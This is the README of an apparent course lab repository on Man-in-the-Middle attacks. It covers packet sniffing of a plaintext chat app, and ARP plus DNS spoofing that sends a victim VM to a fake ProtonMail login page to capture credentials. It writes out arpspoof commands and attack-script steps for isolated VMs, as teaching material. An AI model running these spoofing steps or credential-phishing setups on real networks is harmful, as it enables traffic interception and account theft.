# Complete MITM Lab Exercises

Network security lab demonstrating Man-in-the-Middle attacks using ARP/DNS spoofing and packet sniffing.

## Contents

This repository contains two complete lab exercises:

### 📦 Exercise 0: Packet Sniffing with Chat Application
- Simple client-server chat application
- Packet sniffer that captures and forwards traffic
- Monitor display showing sniffed messages
- Demonstrates plaintext protocol vulnerabilities

**Directory:** `exercise-0-packet-sniffing/`

### 🔐 Exercise 1: DNS Spoofing Attack
- ARP spoofing to intercept traffic
- DNS spoofing to redirect victim to fake website
- Fake ProtonMail site to capture credentials
- Demonstrates importance of HTTPS/TLS

**Directory:** `exercise-1-dns-spoofing/`

---

## Requirements

### Hardware/VMs
- **3 Kali Linux VMs** (or any Linux distribution with required tools)
- VirtualBox (or VMware/other hypervisor)
- At least 2GB RAM per VM
- Network adapter set to Internal Network

### Software
- Python 3.x (pre-installed on Kali)
- dsniff (arpspoof)
- dnsmasq
- tcpdump/wireshark
- Firefox (for Exercise 1)

---

## Quick Start

### Exercise 0: Packet Sniffing

See detailed instructions in `exercise-0-packet-sniffing/README-EX0.md`

**Quick setup:**
```bash
# VM2 (Server): 192.168.100.10
python3 server.py

# VM1 (Client): 192.168.100.20
python3 client.py

# VM3 (Attacker): 192.168.100.30
# Terminal 1:
python3 monitor.py

# Terminal 2:
sudo arpspoof -i eth0 -t 192.168.100.20 192.168.100.10 &
sudo arpspoof -i eth0 -t 192.168.100.10 192.168.100.20 &

# Terminal 3:
sudo python3 sniffer.py
```

### Exercise 1: DNS Spoofing

See detailed instructions in `exercise-1-dns-spoofing/README-EX1.md`

**Quick setup:**
```bash
# VM3 (Fake Server): 192.168.1.30
sudo ./setup-vm3-webserver.sh
./start-webserver.sh

# VM2 (Attacker): 192.168.1.20
sudo ./setup-vm2-attacker.sh
sudo ./start-attack.sh

# VM1 (Victim): 192.168.1.10
sudo ./setup-vm1-victim.sh
firefox http://protonmail.com
```

---

## Project Structure

```
mitm-complete-project/
│
├── README.md (this file)
│
├── exercise-0-packet-sniffing/
│   ├── server.py
│   ├── client.py
│   ├── sniffer.py
│   ├── monitor.py
│   └── README-EX0.md
│
└── exercise-1-dns-spoofing/
    ├── setup-vm1-victim.sh
    ├── setup-vm2-attacker.sh
    ├── setup-vm3-webserver.sh
    ├── dnsmasq.conf
    ├── dnsmasq.hosts
    ├── fake-protonmail/
    │   ├── index.html
    │   └── assets/
    ├── start-attack.sh
    ├── stop-attack.sh
    └── README-EX1.md
```

---

## Network Topologies

### Exercise 0 (Packet Sniffing)
```
Network: 192.168.100.0/24

┌─────────────┐         ┌─────────────┐         ┌─────────────┐
│   VM1       │◄───────►│   VM3       │◄───────►│   VM2       │
│   Client    │  Chat   │  Attacker   │  Chat   │   Server    │
│ .100.20     │ Traffic │  .100.30    │ Traffic │  .100.10    │
│             │         │             │         │             │
│ client.py   │         │ sniffer.py  │         │ server.py   │
│             │         │ monitor.py  │         │             │
└─────────────┘         └─────────────┘         └─────────────┘
                             │  
                             │ Sniffed Packets
                             ▼
                        [Monitor Display]
```

### Exercise 1 (DNS Spoofing)
```
Network: 192.168.1.0/24

                    ┌─────────────┐
                    │   Router    │
                    │  .1.254     │
                    │  (Gateway)  │
                    └──────┬──────┘
                           │
         ┌─────────────────┼─────────────────┐
         │                 │                 │
         │                 │                 │
    ┌────▼────┐       ┌────▼────┐       ┌────▼────┐
    │  VM1    │       │  VM2    │       │  VM3    │
    │ Victim  │       │ Attacker│       │  Fake   │
    │ .1.10   │       │  .1.20  │       │  Web    │
    │         │       │         │       │  .1.30  │
    │ Firefox │       │ ARP +   │       │ Fake    │
    │         │       │ DNS     │       │ Proton  │
    │         │       │ Spoof   │       │ Mail    │
    └─────────┘       └─────────┘       └─────────┘
         │                 │                 │
         └─────────────────┴─────────────────┘
                   Internal Network
```

---

## Learning Objectives

By completing these exercises, you will understand:

1. **How packet sniffing works** on local networks
2. **ARP spoofing** and how to become MITM
3. **DNS spoofing** to redirect victims to fake sites
4. **Why encryption (TLS/HTTPS) is critical**
5. **How credentials can be stolen** over unencrypted connections
6. **Network attack detection and prevention**

---

## Safety & Ethics

⚠️ **IMPORTANT:**

- These exercises are for **EDUCATIONAL PURPOSES ONLY**
- Only use in isolated lab environments
- Never attack networks without explicit permission
- Unauthorized network attacks are **ILLEGAL**
- Use this knowledge to **defend**, not to attack

---

## Troubleshooting Common Issues

### VMs can't communicate
1. Verify all VMs use same Internal Network name
2. Check IP configuration: `ip addr show`
3. Test with ping between VMs
4. Disable firewall temporarily: `sudo ufw disable`

### Permission denied errors
- Most scripts need root privileges
- Run with `sudo`
- Check file permissions: `chmod +x script.sh`

### Sniffer not capturing packets
- Must run with sudo (needs raw socket access)
- Verify promiscuous mode in VirtualBox settings
- Check ARP spoofing is active: `ps aux | grep arpspoof`

### DNS spoofing not working
- Check dnsmasq is running: `systemctl status dnsmasq`
- Verify iptables rules: `iptables -t nat -L -n -v`
- Check DNS log: `tail -f /var/log/dnsmasq.log`

---

## Additional Resources

- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
- [Kali Linux Documentation](https://www.kali.org/docs/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Network Security Basics](https://www.comptia.org/certifications/security)

---

## License

Educational use only. Not for production or malicious use.

---

## Authors

Created for Advanced Network and System Security course.

**Good luck with your lab exercises! 🔒🛡️**
